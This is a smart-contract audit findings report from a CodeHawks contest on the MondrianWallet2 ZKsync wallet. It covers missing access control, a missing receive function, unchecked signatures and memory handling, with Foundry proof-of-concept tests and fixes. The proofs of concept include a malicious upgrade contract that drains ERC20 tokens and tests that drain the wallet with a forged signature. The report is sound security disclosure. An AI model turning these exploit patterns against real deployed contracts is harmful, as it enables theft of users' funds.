# First Flight #19: Mondrian Wallet v2 - Findings Report

# Table of contents
- ### [Contest Summary](#contest-summary)
- ### [Results Summary](#results-summary)
- ## High Risk Findings
    - [H-01. `MondrianWallet2::payForTransaction` lacks access control, allowing a malicious actor to block a transaction by draining the contract prior to validation. ](#H-01)
    - [H-02. Lack of access control in `authorizeUpgrade` leads to funds takeover, as implementation logic can be upgraded by him/her](#H-02)
    - [H-03. The contract is supposed to be a wallet but a `receive()` function is not defined which prevents the transfer of funds to the contract](#H-03)
    - [H-04. The signature of the transactions are not validated correctly which allows a malicious user to drain all the funds](#H-04)
- ## Medium Risk Findings
    - [M-01. Use `SignatureChecker` Over `ECDSA` for Signature Validation](#M-01)
    - [M-02. Lacking control on return data at `MondrianWallet2::_executeTransaction` results in excessive gas usage, unexpected behaviour and unnecessary evm errors.](#M-02)
- ## Low Risk Findings
    - [L-01. The Storage Gap convention for the upgradeable contracts is not followed which can affect layout of future child contracts](#L-01)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #19

### Dates: Jul 4th, 2024 - Jul 11th, 2024

[See more contest details here](https://codehawks.cyfrin.io/c/2024-07-Mondrian-Wallet_v2)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 4
   - Medium: 2
   - Low: 1


# High Risk Findings

## <a id='H-01'></a>H-01. `MondrianWallet2::payForTransaction` lacks access control, allowing a malicious actor to block a transaction by draining the contract prior to validation. 

_Submitted by [mishraji874](/profile/cltepemz50000ouhs442ophcm), [Monstitude](/profile/clpf1gemf0000ngm0m2jtmfgw), [7Cedars](/profile/clvoxksqz000czknxe8hcp7kw), [agent3bood](/profile/clxp80fib0003cnvwyg4fgbge), [paprikrumplikas](/profile/clrj23lnp006g14oum8qxro25). Selected submission by: [7Cedars](/profile/clvoxksqz000czknxe8hcp7kw)._      
            


### `MondrianWallet2::payForTransaction` lacks access control, allowing a malicious actor to block a transaction by draining the contract prior to validation.

**Description:** According to [the ZKsync documentation](https://staging-docs.zksync.io/build/developer-reference/account-abstraction/design#:~:text=in%20a%20block.-,Steps%20in%20the%20Validation,for%20the%20next%20step.,-Execution), the `payForTransaction` function is meant to be called only by the Bootloader to collect fees necessary to execute transactions.

However, because an access control is missing in `MondrianWallet2::payForTransaction` anyone can call the function. There is also no check on how often the function is called.

This allows a malicious actor to observe the transaction in the mempool and use its data to repeatedly call payForTransaction. It results in moving funds from `MondrianWallet2` to the ZKSync Bootloader.

```javascript
@>  function payForTransaction(bytes32, /*_txHash*/ bytes32, /*_suggestedSignedHash*/ Transaction memory _transaction)
        external
        payable
    {  
```

**Impact:** When funds are moved from the `MondrianWallet2` to the ZKSync Bootloader, `MondrianWallet2::validateTransaction` will fail due to lack of funds. Also, when the bootloader itself eventually calls `payForTransaction` to retrieve funds, this function will fail.

In effect, the lack of access controls on `MondrianWallet2::payForTransaction` allows for any transaction to be blocked by a malicious user.

Please note that [there is a refund of unused fees on ZKsync](https://staging-docs.zksync.io/build/developer-reference/fee-model). As such, it is likely that `MondrianWallet2` will eventually receive a refund of its fees. However, it is likely a refund will only happen after the transaction has been declined.

**Proof of Concept:**
Due to limits in the toolchain used (foundry) to test the ZKSync blockchain, it was not possible to obtain a fine grained understanding of how the bootloader goes through the life cycle of a 113 type transaction. It made it impossible to create a true Proof of Concept of this vulnerability. What follows is as close as possible approximation using foundry's standard test suite.

The sequence:

1. Normal user A creates a transaction.
2. Malicious user B observes the transaction.
3. Malicious user B calls `MondrianWallet2::payForTransaction` until `mondrianWallet2.balance < transaction.maxFeePerGas * transaction.gasLimit`.
4. The bootloader calls `MondrianWallet::validateTransaction`.
5. `MondrianWallet::validateTransaction` fails because of lack of funds.

<details>
<summary> Proof of Concept</summary>

Place the following in `ModrianWallet2Test.t.sol`.

```javascript
    // You'll also need --system-mode=true to run this test
    function testBlockTransactionByPayingForTransaction() public onlyZkSync {
        // Prepare
        uint256 FUNDS_MONDRIAN_WALLET = 1e16; 
        vm.deal(address(mondrianWallet), FUNDS_MONDRIAN_WALLET); 
        address THIRD_PARTY_ACCOUNT = makeAddr("3rdParty");
        
        // create transaction  
        address dest = address(usdc);
        uint256 value = 0;
        bytes memory functionData = abi.encodeWithSelector(ERC20Mock.mint.selector, address(mondrianWallet), AMOUNT);
        Transaction memory transaction = _createUnsignedTransaction(mondrianWallet.owner(), 113, dest, value, functionData);
        transaction = _signTransaction(transaction);

        // using information embedded in the Transaction struct, we can calculate how much fee will be paid for the transaction
        // and, crucially, how many runs we need to move sufficient funds from the Mondrian Wallet to the Bootloader until mondrianWallet2.balance < transaction.maxFeePerGas * transaction.gasLimit.  
        uint256 feeAmountPerTransaction = transaction.maxFeePerGas * transaction.gasLimit;
        uint256 runsNeeded = FUNDS_MONDRIAN_WALLET / feeAmountPerTransaction; 
        console2.log("runsNeeded to drain Mondrian Wallet:", runsNeeded); 

        // Act 
        // by calling payForTransaction a sufficient amount of times, the contract is drained.  
        vm.startPrank(THIRD_PARTY_ACCOUNT); 
        for (uint256 i; i < runsNeeded; i++) {
            mondrianWallet.payForTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction);
        }
        vm.stopPrank();         
        
        // Act & Assert 
        // When the bootloader calls validateTransaction, it fails: Not Enough Balance.   
        vm.prank(BOOTLOADER_FORMAL_ADDRESS);
        vm.expectRevert(MondrianWallet2.MondrianWallet2__NotEnoughBalance.selector); 
        bytes4 magic = mondrianWallet.validateTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction);
    }
```

</details>

**Recommended Mitigation:** Add an access control to the `MondrianWallet2::payForTransaction` function, allowing only the bootloader to call the function.

```diff
function payForTransaction(bytes32, /*_txHash*/ bytes32, /*_suggestedSignedHash*/ Transaction memory _transaction)
        external
        payable
+       requireFromBootLoader  
```

## <a id='H-02'></a>H-02. Lack of access control in `authorizeUpgrade` leads to funds takeover, as implementation logic can be upgraded by him/her

_Submitted by [Enchev](/profile/clvuhiie70000behfon10s33j), [V1vah0us3](/profile/clvzfjns5000024axn3o3i5if), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [lulox](/profile/clk7oytas000wme08y4yvo0tp), [mrfixit](/profile/clycn382y0006211c2kj5ercs), [0x5chn0uf](/profile/cly1omxrr000at777spfn77je), [0xlrivo](/profile/clqo26w180006cl27lldffow6), [jaxcoder](/profile/cly7suk8x000axuhq68vibx8t), [0xjoaovpsantos](/profile/clwigghmc000s14ecvmooztur), [4lifemen](/profile/clx78updg0000r91i3473u4ld), [7Cedars](/profile/clvoxksqz000czknxe8hcp7kw), [NightHawK](/profile/clvmfeh090004jbg1f2oa6srl), [Yaioxy](/profile/clpd5e0m30002ll5wwhxvqj1u), [Baptizer](/profile/clx160mya001410bzpjc9rn0r), [soupy](/profile/clxtrdlee0002mh58dhdplsq9), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [paprikrumplikas](/profile/clrj23lnp006g14oum8qxro25), [agent3bood](/profile/clxp80fib0003cnvwyg4fgbge), [4rdiii](/profile/cltd0fp0400016x0wyrg9ny31), [dhanesh24g](/profile/clsr2tc550000c8h48qi9sqty). Selected submission by: [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl)._      
            


## Summary

`MondrianWallet2` is using `UUPS` proxy for upgradability in near future, however lack of access control makes in useless. As anybody can upgrade the contract implementation to drain funds, by modifying the logic or adding new functions.

## Vulnerability Details

Relevant link - <https://github.com/Cyfrin/2024-07-Mondrian-Wallet_v2/blob/main/src/MondrianWallet2.sol#L167>

```solidity
 function _authorizeUpgrade(address newImplementation) internal override {}
```

If you notice the above function, it does not have access control, which is necessary to protect upgrading to random implementation by anybody. As a result, anybody can call `upgradeToAndCall` and change the implementation logic to change the logic or add new function to take over the wallet.

## POC

In src, create new file Attack.sol
Keeping other code same as previous implementation we'll add two functions only.

```diff
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

////  Existing Imports from prev version

+ import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+ import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

- /**
- * @title MondrianWallet2
- * @notice Its upgradable! So there shouldn't be any issues because we can just upgrade!... right?
- */
- contract MondrianWallet2 is IAccount, Initializable, OwnableUpgradeable, UUPSUpgradeable {

+   /**
+  * @title MondrianWallet2Update
+ * @notice Its upgraded! So we should be able to take funds, right?
+  */

+contract Attack is IAccount, Initializable, OwnableUpgradeable, UUPSUpgradeable {
    using MemoryTransactionHelper for Transaction;
    

    error MondrianWallet2__NotEnoughBalance();
    error MondrianWallet2__NotFromBootLoader();
    error MondrianWallet2__ExecutionFailed();
    error MondrianWallet2__NotFromBootLoaderOrOwner();
    error MondrianWallet2__FailedToPay();
    error MondrianWallet2__InvalidSignature();

    /*//////////////////////////////////////////////////////////////
                               MODIFIERS
    //////////////////////////////////////////////////////////////*/
    modifier requireFromBootLoader() {
        if (msg.sender != BOOTLOADER_FORMAL_ADDRESS) {
            revert MondrianWallet2__NotFromBootLoader();
        }
        _;
    }

    modifier requireFromBootLoaderOrOwner() {
        if (msg.sender != BOOTLOADER_FORMAL_ADDRESS && msg.sender != owner()) {
            revert MondrianWallet2__NotFromBootLoaderOrOwner();
        }
        _;
    }

    function initialize() public initializer {
        __Ownable_init(msg.sender);
        __UUPSUpgradeable_init();
    }

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }


    
    
+    /// CLAIM ANY ERC20, CALLABLE BY ATTACKER
+   function claimERC20(address token, uint256 value) external {
+        if(msg.sender == address(0x123)){
+            SafeERC20.safeTransfer(IERC20(token), address(0x123), value);
+        }
+    }

    
   /// Existing codebase
}

```

In existing test suite we following imports, test

```diff
pragma solidity 0.8.24;

   import {Test, console2} from "forge-std/Test.sol";
   import {MondrianWallet2} from "src/MondrianWallet2.sol";
+ import {Attack} from "src/Attack.sol";

// Era Imports
import {
    Transaction,
    MemoryTransactionHelper
} from "lib/foundry-era-contracts/src/system-contracts/contracts/libraries/MemoryTransactionHelper.sol";
import {BOOTLOADER_FORMAL_ADDRESS} from "lib/foundry-era-contracts/src/system-contracts/contracts/Constants.sol";
import {ACCOUNT_VALIDATION_SUCCESS_MAGIC} from
    "lib/foundry-era-contracts/src/system-contracts/contracts/interfaces/IAccount.sol";

// OZ Imports
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";

// Foundry Devops
import {ZkSyncChainChecker} from "lib/foundry-devops/src/ZkSyncChainChecker.sol";

interface _CheatCodes {
    function ffi(string[] calldata) external returns (bytes memory);
}

contract MondrianWallet2Test is Test, ZkSyncChainChecker {
    using MessageHashUtils for bytes32;

    MondrianWallet2 implementation;
    MondrianWallet2 mondrianWallet;
+    Attack maliciousImplementation;
+    address attacker = address(0x123);
    ERC20Mock usdc;
    bytes4 constant EIP1271_SUCCESS_RETURN_VALUE = 0x1626ba7e;
    _CheatCodes cheatCodes = _CheatCodes(VM_ADDRESS);

    uint256 constant AMOUNT = 1e18;
    bytes32 constant EMPTY_BYTES32 = bytes32(0);
    address constant ANVIL_DEFAULT_ACCOUNT = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;

    function setUp() public {
        implementation = new MondrianWallet2();
        maliciousImplementation = new Attack();
        ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), "");
        mondrianWallet = MondrianWallet2(address(proxy));
        mondrianWallet.initialize();
        mondrianWallet.transferOwnership(ANVIL_DEFAULT_ACCOUNT);
        usdc = new ERC20Mock();
+        usdc.mint(address(mondrianWallet), AMOUNT);
-        vm.deal(address(mondrianWallet), AMOUNT);
    }

+    function testUpgradeToMaliciousAndClaimUSD() public {
        
+        vm.startPrank(attacker);
+        address wallet = address(mondrianWallet);
+        mondrianWallet.upgradeToAndCall(address(maliciousImplementation), "");
+        console2.log("success");
+        /// to see if attacker can claim usdc or not
+        /// let's try to claim usdc that it has

+        console2.log("----------------------------------------------------");
+        console2.log("-----------------CLAIM_ERC20------------------------");
+        console2.log("----------------------------------------------------");

+        console2.log("usdc balance of attacker before attack:", usdc.balanceOf(attacker));
+       console2.log("usdc balance of mondrian wallet before attack:", usdc.balanceOf(wallet));
+       Attack(wallet).claimERC20(address(usdc), 1e18);
+        console2.log("usdc balance of attacker after attack:", usdc.balanceOf(attacker));
+        console2.log("usdc balance of mondrian wallet after attack:", usdc.balanceOf(wallet));
      

   }
```

now run `forge test --mt testUpgradeToMaliciousAndClaimUSD -vv --zksync` and we get following output from the terminal.

```js
[⠒] Compiling...
[⠒] Compiling (zksync)...
[⠆] Solc 0.8.24 finished in 13.57s

Ran 1 test for test/ModrianWallet2Test.t.sol:MondrianWallet2Test
[PASS] testUpgradeToMaliciousAndClaimUSD() (gas: 112776)
Logs:
  success
  ----------------------------------------------------
  -----------------CLAIM_ERC20------------------------
  ----------------------------------------------------
  usdc balance of attacker before attack: 0
  usdc balance of mondrian wallet before attack: 1000000000000000000
  usdc balance of attacker after attack: 1000000000000000000
  usdc balance of mondrian wallet after attack: 0

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.19ms (280.38µs CPU time)

Ran 1 test suite in 29.34ms (1.19ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Impact

Loss of funds

## Tools Used

Manual Review, Foundry

## Recommendations

add `onlyOwner` modifier to fix the issue as show below.

```diff
-  function _authorizeUpgrade(address newImplementation) internal override {}
+ function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
```

When we make above changes to MondrianWallet2.sol, and run `forge test --mt testUpgradeToMaliciousAndClaimUSD -vv` again, it gives us following output in terminal -

```js

[⠒] Compiling...
[⠑] Compiling 3 files with 0.8.24
[⠢] Solc 0.8.24 finished in 14.52s
Compiler run successful!
[⠆] Compiling (zksync)...
Compiler run successful!...

Ran 1 test for test/ModrianWallet2Test.t.sol:MondrianWallet2Test
[FAIL. Reason: OwnableUnauthorizedAccount(0x0000000000000000000000000000000000000123)] testUpgradeToMaliciousAndClaimUSD() (gas: 20574)
Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.31ms (254.63µs CPU time)

Ran 1 test suite in 26.54ms (1.31ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
```

Which verify the fix is working correctly.

## <a id='H-03'></a>H-03. The contract is supposed to be a wallet but a `receive()` function is not defined which prevents the transfer of funds to the contract

_Submitted by [V1vah0us3](/profile/clvzfjns5000024axn3o3i5if), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [lulox](/profile/clk7oytas000wme08y4yvo0tp), [jaxcoder](/profile/cly7suk8x000axuhq68vibx8t), [7Cedars](/profile/clvoxksqz000czknxe8hcp7kw), [NightHawK](/profile/clvmfeh090004jbg1f2oa6srl), [0xjoaovpsantos](/profile/clwigghmc000s14ecvmooztur), [Yaioxy](/profile/clpd5e0m30002ll5wwhxvqj1u), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [Monstitude](/profile/clpf1gemf0000ngm0m2jtmfgw). Selected submission by: [NightHawK](/profile/clvmfeh090004jbg1f2oa6srl)._      
            


## Summary

The `receive()` function is not defined in the `MondrianWallet2` contract. This will prevent the contract to receive any funds. But the contract is supposed to be used as a wallet. So, this is an unwanted limitation.

## Vulnerability Details

The `MondrianWallet2` contract does not provide a `receive()` function. This means that the contract is not payable and cannot receive any funds. So, it cannot be used as a wallet which breaks the desired functionality.

## Impact

The `MondrianWallet2` is unable to receive funds. This breaks the desired logic. It can be demonstrated with the following test.

### Proof of Code

Look at the following test.

```js
function testReceive() public {
    MondrianWallet2 implementation = new MondrianWallet2();
    ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), "");
    MondrianWallet2 mondrianWallet = MondrianWallet2(
        payable(address(proxy))
    );
    mondrianWallet.initialize();
    mondrianWallet.transferOwnership(
        0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
    );

    address user = makeAddr("user");
    vm.startPrank(user);
    vm.deal(user, 1e18);
    address(mondrianWallet).call{value: 1e18}("");
    vm.stopPrank();

    // No funds were transferred to the Mondrian Wallet
    assertEq(user.balance, 1e18);
}
```

The tests proves that no funds can be transferred to the contract.

## Tools Used

Manual Review

## Recommendations

Add the `receive()` function to the `MondrianWallet2` contract. Look at the following code.

```diff
contract MondrianWallet2 is IAccount, Initializable, OwnableUpgradeable, UUPSUpgradeable {
    ...

+   receive() external payable {}

    ...
}
```

After the method is added it can be confirmed that the contract can receive funds with the following test.

```js
function testReceiveFixed() public {
    MondrianWallet2 implementation = new MondrianWallet2();
    ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), "");
    MondrianWallet2 mondrianWallet = MondrianWallet2(
        payable(address(proxy))
    );
    mondrianWallet.initialize();
    mondrianWallet.transferOwnership(
        0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
    );

    address user = makeAddr("user");
    vm.startPrank(user);
    vm.deal(user, 1e18);
    address(mondrianWallet).call{value: 1e18}("");
    vm.stopPrank();

    // Funds were transferred to the Mondrian Wallet
    assertEq(address(mondrianWallet).balance, 1e18);
    assertEq(user.balance, 0);
}
```
## <a id='H-04'></a>H-04. The signature of the transactions are not validated correctly which allows a malicious user to drain all the funds

_Submitted by [V1vah0us3](/profile/clvzfjns5000024axn3o3i5if), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [0x5chn0uf](/profile/cly1omxrr000at777spfn77je), [4lifemen](/profile/clx78updg0000r91i3473u4ld), [kevinkkien](/profile/clnieha040000l4088bamgykh), [0xjoaovpsantos](/profile/clwigghmc000s14ecvmooztur), [7Cedars](/profile/clvoxksqz000czknxe8hcp7kw), [NightHawK](/profile/clvmfeh090004jbg1f2oa6srl), [Yaioxy](/profile/clpd5e0m30002ll5wwhxvqj1u), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [paprikrumplikas](/profile/clrj23lnp006g14oum8qxro25), [4rdiii](/profile/cltd0fp0400016x0wyrg9ny31), [agent3bood](/profile/clxp80fib0003cnvwyg4fgbge), [Monstitude](/profile/clpf1gemf0000ngm0m2jtmfgw). Selected submission by: [NightHawK](/profile/clvmfeh090004jbg1f2oa6srl)._      
            


## Summary

The `MondrianWallet2` contract allows execution of signed transactions. But the signature is not validated correctly which can allow a malicious user to drain all the funds of the protocol.

## Vulnerability Details

The `MondrianWallet2` contract does execute `_validateTransactions` function from the function `executeTransactionFromOutside` in [Line 97 of MondrianWallet2.sol](https://github.com/Cyfrin/2024-07-Mondrian-Wallet_v2/blob/2abc3e4831d27ae9c498edd3782fd61524587dc0/src/MondrianWallet2.sol#L97). But the result from this execution is not checked. If the signature of the transaction is wrong (different from the owner), the transaction will still be executed. This can be exploited by a malicious user to drain the protocol.

## Impact

A malicious user can self sign a transaction and drain all of the funds of the protocol. The impact is verified with the following test.

### Proof of Code

The impact is demonstrated with the following test. Which can be executed with: `forge test --zksync --system-mode=true --mt "testUnauthorizedTransactionFixed"`.

```js
function testUnauthorizedTransaction() public onlyZkSync {
    MondrianWallet2 implementation = new MondrianWallet2();
    ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), "");
    MondrianWallet2 mondrianWallet = MondrianWallet2(address(proxy));
    mondrianWallet.initialize();
    mondrianWallet.transferOwnership(
        0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
    );

    vm.deal(address(mondrianWallet), 1e18);
    (address user, uint256 key) = makeAddrAndKey("user");

    uint256 value = 1e18;
    bytes memory functionData = abi.encodeWithSelector(
        ERC20Mock.mint.selector,
        address(mondrianWallet),
        1e18
    );

    uint256 nonce = vm.getNonce(address(mondrianWallet));
    bytes32[] memory factoryDeps = new bytes32[](0);
    Transaction memory transaction = Transaction({
        txType: 113, // type 113 (0x71).
        from: uint256(uint160(mondrianWallet.owner())),
        to: uint256(uint160(user)),
        gasLimit: 0, //16777216,
        gasPerPubdataByteLimit: 16777216,
        maxFeePerGas: 16777216,
        maxPriorityFeePerGas: 16777216,
        paymaster: 0,
        nonce: nonce,
        value: value,
        reserved: [uint256(0), uint256(0), uint256(0), uint256(0)],
        data: functionData,
        signature: hex"",
        factoryDeps: factoryDeps,
        paymasterInput: hex"",
        reservedDynamic: hex""
    });

    bytes32 unsignedTransactionHash = MemoryTransactionHelper.encodeHash(
        transaction
    );

    (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, unsignedTransactionHash);
    transaction.signature = abi.encodePacked(r, s, v);

    vm.prank(user);
    mondrianWallet.executeTransactionFromOutside(transaction);

    // The transaction signed by the user is executed
    assertEq(user.balance, 1e18);
    // All the funds are drained
    assertEq(address(mondrianWallet).balance, 0);
}
```

The test confirms that there are no funds left in the protocol. All the funds are transferred to the user by using a transaction with wrong signature.

## Tools Used

Manual Review

## Recommendations

Add the following code which will cause the function `executeTransactionFromOutside` to revert when the transaction signature is not correct.

```diff
function executeTransactionFromOutside(
    Transaction memory _transaction
) external payable {
-   _validateTransaction(_transaction);
+   bytes4 magic = _validateTransaction(_transaction);
+   if (magic != ACCOUNT_VALIDATION_SUCCESS_MAGIC) {
+       revert MondrianWallet2__InvalidSignature();
+   }
    _executeTransaction(_transaction);
}
```

After this code is added it can be confirmed that the function will revert with the following test. It can be executed with: `forge test --zksync --system-mode=true --mt "testUnauthorizedTransactionFixed"`.

```js
error MondrianWallet2__InvalidSignature();

function testUnauthorizedTransactionFixed() public onlyZkSync {
    MondrianWallet2 implementation = new MondrianWallet2();
    ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), "");
    MondrianWallet2 mondrianWallet = MondrianWallet2(address(proxy));
    mondrianWallet.initialize();
    mondrianWallet.transferOwnership(
        0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
    );

    vm.deal(address(mondrianWallet), 1e18);
    (address user, uint256 key) = makeAddrAndKey("user");

    uint256 value = 1e18;
    bytes memory functionData = abi.encodeWithSelector(
        ERC20Mock.mint.selector,
        address(mondrianWallet),
        1e18
    );

    uint256 nonce = vm.getNonce(address(mondrianWallet));
    bytes32[] memory factoryDeps = new bytes32[](0);
    Transaction memory transaction = Transaction({
        txType: 113, // type 113 (0x71).
        from: uint256(uint160(mondrianWallet.owner())),
        to: uint256(uint160(user)),
        gasLimit: 0, //16777216,
        gasPerPubdataByteLimit: 16777216,
        maxFeePerGas: 16777216,
        maxPriorityFeePerGas: 16777216,
        paymaster: 0,
        nonce: nonce,
        value: value,
        reserved: [uint256(0), uint256(0), uint256(0), uint256(0)],
        data: functionData,
        signature: hex"",
        factoryDeps: factoryDeps,
        paymasterInput: hex"",
        reservedDynamic: hex""
    });

    bytes32 unsignedTransactionHash = MemoryTransactionHelper.encodeHash(
        transaction
    );

    (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, unsignedTransactionHash);
    transaction.signature = abi.encodePacked(r, s, v);

    vm.expectRevert(
        abi.encodeWithSelector(
            MondrianWallet2__InvalidSignature.selector
        )
    );
    vm.prank(user);
    mondrianWallet.executeTransactionFromOutside(transaction);

    // User balance is 0
    assertEq(user.balance, 0);
    // All the funds are still into the protocol
    assertEq(address(mondrianWallet).balance, 1e18);
}
```

# Medium Risk Findings

## <a id='M-01'></a>M-01. Use `SignatureChecker` Over `ECDSA` for Signature Validation

_Submitted by [NitAuditzz](/profile/clwjf3tz3000015npkmxzk2p8), [4rdiii](/profile/cltd0fp0400016x0wyrg9ny31), [paprikrumplikas](/profile/clrj23lnp006g14oum8qxro25). Selected submission by: [4rdiii](/profile/cltd0fp0400016x0wyrg9ny31)._      
            



**Description:**
The zkSync era documentation suggests using `SignatureChecker` instead of `ECDSA` for signature validation. This advice is grounded in the distinction between ECDSA signatures and contract signatures. Unlike ECDSA signatures, contract signatures are revocable, meaning their validity can change over time. For instance, a signature might be considered valid at block N but invalid at block N+1, or vice versa.

**Impact:**
Accounts may utilize different signature schemes, making `ECDSA.recover` ineffective for accurate signature validation. This limitation could result in failed validations and potential security risks.

**Recommended Mitigation:**
To mitigate this issue, incorporate a `isValidSignature` function into your smart contract. This function should utilize `SignatureChecker` from the OpenZeppelin contracts library, shifting away from the conventional use of `ECDSA.recover`.
Here's an illustrative implementation:

```diff
+ import { SignatureChecker } from "@openzeppelin/contracts/utils/cryptography/SignatureChecker.sol";
.
.
.
+   function isValidSignature(
+       address _address,
+       bytes32 _hash,
+       bytes memory _signature
+   ) public pure returns (bool) {
+       return _address.isValidSignatureNow(_hash, _signature);
+   }
```

## <a id='M-02'></a>M-02. Lacking control on return data at `MondrianWallet2::_executeTransaction` results in excessive gas usage, unexpected behaviour and unnecessary evm errors.

_Submitted by [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [7Cedars](/profile/clvoxksqz000czknxe8hcp7kw), [NightHawK](/profile/clvmfeh090004jbg1f2oa6srl), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [paprikrumplikas](/profile/clrj23lnp006g14oum8qxro25). Selected submission by: [7Cedars](/profile/clvoxksqz000czknxe8hcp7kw)._      
            



### Lacking control on return data at `MondrianWallet2::_executeTransaction` results in excessive gas usage, unexpected behaviour and unnecessary evm errors.

**Description:** The `_executeTransaction` function uses a standard `.call` function to execute the transaction. This function returns a `bool success` and `bytes memory data`. 

However, ZKsync handles the return of this the `bytes data` differently than on Ethereum mainnet. In their own words, from [the ZKsync documentation](https://docs.zksync.io/build/developer-reference/ethereum-differences/evm-instructions#:~:text=thus%2C%20unlike%20evm%20where%20memory%20growth%20occurs%20before%20the%20call%20itself%2C%20on%20zksync%20era%2C%20the%20necessary%20copying%20of%20return%20data%20happens%20only%20after%20the%20call%20has%20ended%2C%20leading%20to%20a%20difference%20in%20msize()%20and%20sometimes%20zksync%20era%20not%20panicking%20where%20evm%20would%20panic%20due%20to%20the%20difference%20in%20memory%20growth.): 
>
> unlike EVM where memory growth occurs before the call itself, on ZKsync Era, the necessary copying of return data happens only after the call has ended
> 

Even though the data field is not used (see the empty space after the comma in `(success,)` below), it does receive this data and build it up in memory  _after_ the call has succeeded. 

```javascript
  (success,) = to.call{value: value}(data);
```

**Impact:** Some calls that ought to return a fail (due to excessive build up of memory) will pass the initial `success` check, and only fail afterwards through an `evm error`. Or, inversely, because `_executeTransaction` allows functions to return data and have it stored in memory, some functions fail that ought to succeed. 

The above especially applies to transactions that call a function that returns large amount of bytes. 

Additionally, 
-  `_executeTransaction` is _very_ gas inefficient due to this issue.
-  As the execution fails with a `evm error` instead of a correct `MondrianWallet2__ExecutionFailed` error message, functionality of frontend apps might be impacted.  

**Proof of Concept:**
1. A contract has been deployed that returns a large amount of data. 
2. `MondrianWallet2` calls this contract. 
3. The contract fails with an `evm error` instead of `MondrianWallet2__ExecutionFailed`. 

After mitigating this issue (see the Recommended Mitigation section below) 
4. No call fail with an `evm error` anymore.  

<details>
<summary> Proof of Concept</summary>

Place the following code after the existing tests in `ModrianWallet2Test.t.sol`: 
```javascript 
  contract TargetContract {
      uint256 public arrayStorage;  

      constructor() {}
      
      function writeToArrayStorage(uint256 _value) external returns (uint256[] memory value) {
          arrayStorage = _value;

          uint256[] memory arr = new uint256[](_value);  
          
          return arr;
      }
  }
```

Place the following code in between the existing tests in `ModrianWallet2Test.t.sol`: 
```javascript
      // You'll also need --system-mode=true to run this test
    function testMemoryAndReturnData() public onlyZkSync {
        TargetContract targetContract = new TargetContract(); 
        vm.deal(address(mondrianWallet), 100); 
        address dest = address(targetContract);
        uint256 value = 0;
        uint256 inputValue; 

        // transaction 1
        inputValue = 310_000;
        bytes memory functionData1 = abi.encodeWithSelector(TargetContract.writeToArrayStorage.selector, inputValue, AMOUNT);
        Transaction memory transaction1 = _createUnsignedTransaction(mondrianWallet.owner(), 113, dest, value, functionData1);
        transaction1 = _signTransaction(transaction1);

        // transaction 2 
        inputValue = 475_000;
        bytes memory functionData2 = abi.encodeWithSelector(TargetContract.writeToArrayStorage.selector, inputValue, AMOUNT);
        Transaction memory transaction2 = _createUnsignedTransaction(mondrianWallet.owner(), 113, dest, value, functionData2);
        transaction2 = _signTransaction(transaction2);

        vm.startPrank(ANVIL_DEFAULT_ACCOUNT);
        // the first transaction fails because of an EVM error. 
        // this transaction will pass with the mitigations implemented (see above). 
        vm.expectRevert(); 
        mondrianWallet.executeTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction1);

        // the second transaction fails because of an ExecutionFailed error. 
        // this transaction will also not pass with the mitigations implemented (see above). 
        vm.expectRevert(); 
        mondrianWallet.executeTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction2);

        vm.stopPrank(); 
    }
```
</details>

**Recommended Mitigation:** By disallowing functions to write return data to memory, this problem can be avoided. In short, replace the standard `.call` with an (assembly) call that restricts the return data to length 0.  

```diff 
-   (success,) = to.call{value: value}(data);
+    assembly {
        success := call(gas(), to, value, add(data, 0x20), mload(data), 0, 0)
     }
```


# Low Risk Findings

## <a id='L-01'></a>L-01. The Storage Gap convention for the upgradeable contracts is not followed which can affect layout of future child contracts

_Submitted by [NightHawK](/profile/clvmfeh090004jbg1f2oa6srl), [Yaioxy](/profile/clpd5e0m30002ll5wwhxvqj1u). Selected submission by: [NightHawK](/profile/clvmfeh090004jbg1f2oa6srl)._      
            


## Summary

Storage gaps are used by a convention for reserving storage slots in a base contract. This allows future versions of that contract to use up those slots without affecting the storage layout of child contracts. The `__gap` variable is missing from the `MondrianWallet2` contract.

